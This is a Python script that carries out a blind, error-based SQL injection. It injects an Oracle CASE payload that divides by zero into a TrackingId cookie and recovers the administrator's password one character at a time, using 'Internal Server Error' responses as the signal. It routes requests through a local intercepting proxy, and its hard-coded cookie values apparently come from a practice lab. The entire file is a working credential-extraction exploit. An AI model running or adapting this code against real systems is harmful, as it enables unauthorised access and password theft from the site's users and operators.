import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def sqli_password_extractor(url):
    password_extracted = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"

    print("[+] Starting password extraction...\n")

    for i in range(1, 21): 
        found = False
        for char in charset:
            payload = "'||(SELECT CASE WHEN ascii(SUBSTR((SELECT password FROM users WHERE username='administrator'),%s,1))=%s THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'" % (i, ord(char))
            encoded_payload = urllib.parse.quote(payload)
            
            cookies = {
                'TrackingId': 'kBBNWlCbOjKaFwBN' + encoded_payload,
                'session': '2Hwcn32bM0GVgufymCeU9Z9ZDfaDoXCe'
            }

            r = requests.get(url, cookies=cookies, verify=False,proxies=proxies)

            sys.stdout.write('\r' + ' ' * 80 + '\r')
            sys.stdout.write(f'\r[+] Trying position {i}: {password_extracted}{char}')
            sys.stdout.flush()

            if "Internal Server Error" in r.text:
                password_extracted += char
                sys.stdout.write('\r' + ' ' * 80 + '\r')
                sys.stdout.write(f'\r[+] Found: {password_extracted}\n')
                sys.stdout.flush()
                found = True
                break

        if not found:
            print(f"\n[-] No match found for position {i}. Stopping.")
            break

    print(f"\n[+] Final extracted password: {password_extracted}")

def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s https://example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    sqli_password_extractor(url)

if __name__ == "__main__":
    main()
